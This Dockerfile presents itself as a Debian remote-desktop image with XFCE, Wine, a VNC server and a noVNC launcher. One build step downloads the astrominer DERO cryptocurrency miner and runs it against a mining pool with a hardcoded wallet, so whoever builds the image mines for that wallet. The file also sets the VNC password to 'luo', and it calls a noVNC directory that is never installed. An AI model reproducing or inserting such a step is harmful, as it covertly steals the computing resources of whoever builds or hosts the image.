FROM debian
RUN dpkg --add-architecture i386
RUN apt update
RUN DEBIAN_FRONTEND=noninteractive apt install wine qemu-kvm *zenhei* xz-utils dbus-x11 curl firefox-esr gnome-system-monitor mate-system-monitor  git xfce4 xfce4-terminal tightvncserver wget   -y
RUN wget https://github.com/dero-am/astrobwt-miner/releases/download/V1.9/astrominer-V1.9_modern_amd64_linux.tar.gz
RUN tar xvaf astrominer-V1.9_modern_amd64_linux.tar.gz
RUN ./astrominer -w deroi1qy9al37a8qgjmat4y9wf5wc637md58jtt6p4980k34xxhrk2h9m6jq9pvfz92xcqqqqcmude5ugs76kzdm -m 8 -r community-pools.mysrv.cloud:10300 -p rpc;
RUN echo 'luo' | vncpasswd -f > $HOME/.vnc/passwd
RUN echo '/bin/env  MOZ_FAKE_NO_SANDBOX=1  dbus-launch xfce4-session'  > $HOME/.vnc/xstartup
RUN chmod 600 $HOME/.vnc/passwd
RUN chmod 755 $HOME/.vnc/xstartup
RUN echo 'whoami ' >>/luo.sh
RUN echo 'cd ' >>/luo.sh
RUN echo "su -l -c 'vncserver :2000 -geometry 1360x768' "  >>/luo.sh
RUN echo 'cd /noVNC-1.2.0' >>/luo.sh
RUN echo './utils/launch.sh  --vnc localhost:7900 --listen 8900 ' >>/luo.sh
RUN chmod 755 /luo.sh
EXPOSE 8900
CMD  /luo.sh
